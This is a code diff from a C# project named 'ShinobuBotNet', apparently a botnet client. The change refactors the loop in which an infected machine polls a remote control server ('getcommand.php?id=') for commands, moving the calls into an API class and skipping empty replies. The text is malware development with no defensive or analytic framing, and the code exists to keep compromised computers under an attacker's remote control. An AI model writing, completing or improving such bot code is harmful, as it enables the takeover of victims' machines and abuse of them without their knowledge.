@@ -17,9 +17,12 @@ namespace ShinobuBotNet
             {
                 while (true)
                 {
-                    string id = GetInfo.Get_ID();
-                    string html = web.GetHTML(configs.server + "getcommand.php?id=" + id);
-
+                    string id = API.Get_ID();
+                    string html = API.GetCommand(id);
+                    if(html == "null")
+                    {
+                        continue;
+                    }
 
                     if (last_cmd == html)
                     {
@@ -35,16 +38,21 @@ namespace ShinobuBotNet
                 }
             }
 
+
+
             else
             {
-                cheak.creat_cheak_File();
-                connect.connect_to_API();
+                API.creat_cheak_File();
+                API.connect();
 
                 while (true)
                 {
-                    string id = GetInfo.Get_ID();
-                    string html = web.GetHTML(configs.server + "getcommand.php?id=" + id);
-
+                    string id = API.Get_ID();
+                    string html = API.GetCommand(id);
+                    if (html == "null")
+                    {
+                        continue;
+                    }
 
                     if (last_cmd == html)
                     {
